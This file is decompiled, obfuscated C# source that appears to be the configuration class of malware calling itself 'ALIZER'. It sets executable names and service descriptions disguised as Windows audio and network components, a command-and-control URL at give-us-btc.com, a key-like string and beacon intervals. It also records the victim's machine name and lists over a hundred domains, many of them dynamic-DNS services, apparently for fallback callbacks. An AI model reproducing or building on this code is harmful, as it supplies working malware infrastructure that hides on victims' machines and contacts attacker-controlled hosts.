using System;
using System.Runtime.CompilerServices;
using System.Text;

internal class Class2
{
	public bool bool_0;

	public bool bool_1;

	public bool bool_2;

	public bool bool_3;

	public bool bool_4;

	public bool bool_5;

	public bool bool_6;

	public bool bool_7;

	public bool bool_8;

	public bool bool_9;

	public bool bool_10;

	public bool bool_11;

	public bool bool_12;

	public bool bool_13;

	public bool bool_14;

	public bool bool_15;

	public string[] string_0;

	public string[] string_1;

	public string[] string_2;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public int int_0;

	public int int_1;

	public long long_0;

	public string string_8;

	public string string_9;

	public string string_10;

	public bool bool_16;

	public int int_2;

	public int int_3;

	public long long_1;

	public int int_4;

	public string[] string_11;

	private static Random random_0;

	public Class2()
	{
		Class51.smethod_0();
		bool_0 = true;
		bool_1 = true;
		bool_2 = true;
		bool_3 = true;
		bool_4 = true;
		bool_5 = true;
		bool_6 = true;
		bool_7 = true;
		bool_8 = true;
		bool_9 = true;
		bool_10 = true;
		bool_11 = true;
		bool_12 = true;
		bool_13 = true;
		bool_14 = true;
		bool_15 = true;
		string_0 = new string[2] { "audio32hd.exe", "WUD32Host.exe" };
		string_1 = new string[2] { "Windows System Audio Driver", "Windows System Network Component" };
		string_2 = new string[2];
		string_3 = "http://give-us-btc.com/alizer/info.php";
		string_4 = "/" + smethod_0(new Random().Next(4, 12)) + "/";
		string_5 = "CPF5yOgDHreXs";
		string_6 = "ALIZER";
		string_7 = "1.0.6.8";
		int_0 = 180;
		int_1 = 30;
		long_0 = 15L;
		string_8 = string.Empty;
		string_9 = string.Empty;
		string_10 = Environment.MachineName;
		int_2 = new Random().Next(10000, 20000);
		int_3 = 604052;
		int_4 = 10;
		string_11 = new string[109]
		{
			"becompany.org", "wolmerica.com", "etherbyte.com", "getce.com", "framed.net", "yngling.com", "grupompr.com", "surlenet.be", "parinternet.biz", "gigaportal.pl",
			"devi1.net", "hiddencorner.org", "kevinbradley.org", "wtf-no.com", "americanelectricalservices.net", "dnmcoffman.com", "kein.hk", "jlengineering.se", "drreading.us", "negeriau.net",
			"fintech-llc.com", "fatesperfection.com", "consortiummedia.com", "4twenty.us", "dianyglas.com", "blizzie.net", "rltk.us", "rltk.org", "trailsendfarms.com", "isihia-exi.ro",
			"vxe6.net", "fernando-botero-sculpture.com", "contem.bz", "theabernathyhome.com", "goofyspeak.com", "cybscripts.com", "embeddedsw.org", "embeddedonline.org", "paulkelly.org", "profinet.ro",
			"dara-dal.net", "igliss.com", "death-by-monkeys.com", "fuckcentral.com", "candacechao.com", "thegmc.com", "unibutton.com", "905tech.com", "techgoodness.org", "tnebldc.org",
			"shadir.com", "xn--bser-5qa.org", "vaughngass.com", "fulltimevillain.net", "fin-tech.com", "funkar.nu", "endlessconference.com", "sexyhosting.biz", "carys.org", "amproliability.com",
			"uk.to", "qc.to", "us.to", "lovethosetrains.com", "computersforpeace.net", "smirt.ch", "asianfreshproduce.com", "kaleebso.com", "base-v.ch", "beerprojects.com",
			"rockingwranchinc.com", "xpresit.net", "biz.tm", "info.tm", "shop.tm", "home.kg", "com", "net", "ru", "biz",
			"info", "3utilities.com", "bounceme.net", "ddns.net", "ddnsking.com", "gotdns.ch", "hopto.org", "myftp.biz", "myftp.org", "myvnc.com",
			"no-ip.biz", "no-ip.info", "no-ip.org", "noip.me", "redirectme.net", "servebeer.com", "serveblog.net", "servecounterstrike.com", "serveftp.com", "servegame.com",
			"servehalflife.com", "servehttp.com", "serveminecraft.net", "servemp3.com", "servepics.com", "servequake.com", "sytes.net", "webhop.me", "zapto.org"
		};
		base._002Ector();
	}

	[SpecialName]
	public long method_0()
	{
		return long_1;
	}

	[SpecialName]
	public void method_1(long long_2)
	{
		long_1 = long_2;
	}

	[SpecialName]
	public string method_2()
	{
		return string_3;
	}

	[SpecialName]
	public void method_3(string string_12)
	{
		string_3 = string_12;
	}

	private static string smethod_0(int int_5)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < int_5; i++)
		{
			char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random_0.NextDouble() + 65.0)));
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	static Class2()
	{
		Class51.smethod_0();
		random_0 = new Random((int)DateTime.Now.Ticks);
	}
}
